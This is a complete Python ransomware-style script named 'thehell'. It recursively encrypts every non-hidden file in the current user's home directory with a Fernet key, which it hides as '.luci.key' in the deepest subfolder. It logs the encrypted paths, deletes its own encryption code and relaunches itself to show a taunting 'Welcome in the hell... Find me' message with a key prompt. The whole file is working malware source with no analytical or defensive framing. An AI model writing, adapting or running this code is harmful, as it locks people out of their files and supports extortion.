from cryptography import fernet
from os import scandir, path, system, remove, popen

ASCII = """
████████╗██╗░░██╗███████╗██╗░░██╗███████╗██╗░░░░░██╗░░░░░
╚══██╔══╝██║░░██║██╔════╝██║░░██║██╔════╝██║░░░░░██║░░░░░
░░░██║░░░███████║█████╗░░███████║█████╗░░██║░░░░░██║░░░░░
░░░██║░░░██╔══██║██╔══╝░░██╔══██║██╔══╝░░██║░░░░░██║░░░░░
░░░██║░░░██║░░██║███████╗██║░░██║███████╗███████╗███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚══════╝╚══════╝╚══════╝
"""

USERNAME = ''.join(filter(str.isalnum, popen("whoami").read()))
SOURCE_DIR = f"/home/{USERNAME}/"
ENCRYPTED_FILES_LOG = path.join(SOURCE_DIR, "thehell-encrypted-files.txt")
TESTING_FILE = path.join(SOURCE_DIR, "thehell-enryption-test.txt")

test = input(f"Si si istý {USERNAME}?? [y/N]")
if test == "N" or test == "": 
    exit()

# encryption start

def encrypt_file(file_path: str, key: fernet.Fernet):
    with open(file_path, "rb") as f:
        content = f.read()
        encrypted_content = key.encrypt(content)

    with open(file_path, "wb") as f:
        f.write(encrypted_content)


def encrypt_folder(folder_path: str, key: fernet.Fernet, recursive: bool = True, ignore = None, on_encrypt = None):    
    for file in scandir(folder_path):
        if ignore != None and ignore(file = file): 
            continue
        
        if file.is_dir() and recursive: 
            encrypt_folder(file.path, key = key, recursive = True, ignore = ignore, on_encrypt = on_encrypt)

        else:
            encrypt_file(file.path, key = key)
            if on_encrypt != None: on_encrypt(file = file)


def read_cryptokey(file_path: str) -> fernet.Fernet:
    with open(file_path, "rb") as f:
        key = f.read()
    return fernet.Fernet(key = key)


def save_cryptokey(file_path: str, key: bytes):
    with open(file_path, "wb") as f:
        f.write(key)


def get_low_of_folder(folder_path: str):
    low, lowest_folder = 0, folder_path

    try: files = scandir(folder_path)
    except BaseException: return lowest_folder, low

    for folder in files:
        if not path.isdir(folder.path): continue

        child_folder_path, child_folder_low = get_low_of_folder(folder.path)
        child_folder_low += 1

        if lowest_folder == folder_path or child_folder_low > low:
            low, lowest_folder = child_folder_low, child_folder_path

    return lowest_folder, low


def write_line_to_file(file_path: str, line: str):
    if not line.endswith("\n"): line = f"{line}\n"
    with open(file_path, "a") as f:
        f.write(line)


ignore_files = lambda file: path.basename(file.path).startswith(".") or path.basename(file.path).startswith("thehell")

key_bytes = fernet.Fernet.generate_key()
key = fernet.Fernet(key = key_bytes)

lowest_folder, low = get_low_of_folder(SOURCE_DIR)
key_path = f"{lowest_folder}/.luci.key"

save_cryptokey(key_path, key = key_bytes)

# Encrypt whole directory and save files to log
encrypt_folder(
    folder_path = SOURCE_DIR,
    key = key, 
    ignore = ignore_files, 
    on_encrypt = lambda file: write_line_to_file(ENCRYPTED_FILES_LOG, file.path)
)

# Create file for testing
with open(TESTING_FILE, "w") as f:
    f.write("hello world")
encrypt_file(TESTING_FILE, key = key)

with open(__file__, "r") as f:
    code = f.read().split("\n")
    encrypt_start, encrypt_end = code.index("# encryption start"), code.index("# encryption end") + 1
    code[encrypt_start:encrypt_end] = ""
    code = "\n".join(code)

with open(__file__, "w") as f:
    f.write(code)

system(f"python3 {__file__}")
exit()

# encryption end

# decryption start

def decrypt_file(file_path: str, key: fernet.Fernet):
    with open(file_path, "rb") as f:
        content = f.read()
        encrypted_content = key.decrypt(content)

    with open(file_path, "wb") as f:
        f.write(encrypted_content)


system("clear")
print(ASCII)
print(
    """
        
        Welcome in the hell,
        There is no way out,
        Ur slave of ur time now,
        Find me.

            -- luci

    """
)

with open(ENCRYPTED_FILES_LOG, "r") as f:
    files = [f for f in f.read().split("\n") if f]

if not files:
    print("Congratulations. All your files are free to go.")
        
    remove(TESTING_FILE)
    remove(ENCRYPTED_FILES_LOG)
    remove(__file__)

else:
    decrypted_files = []

    while True:
        key_bin = bytes(input("key: "), encoding = "utf8")
        
        try:
            key = fernet.Fernet(key = key_bin)
            decrypt_file(TESTING_FILE, key = key)
            
            for file in files:
                try:
                    decrypt_file(file, key = key)
                    decrypted_files.append(file)
                except BaseException as error:
                    print(f"Oh no. Some error down here with this file '{file}.")

            break

        except BaseException as error:
            print(f"Oh no. There is some error down here. Error: {error}")

    for df in decrypted_files: 
        files.remove(df)

    if not files:
        print("Congratulations. All your files are free to go.")
        
        remove(TESTING_FILE)
        remove(ENCRYPTED_FILES_LOG)
        remove(__file__)

    else:
        print("Fuck. Some files are still cursed. Maybe they dont exists anymore ?")
        for file in files: print(f" {file}")

        with open(ENCRYPTED_FILES_LOG, "w") as f:
            f.write("\n".join(files))

# decryption end
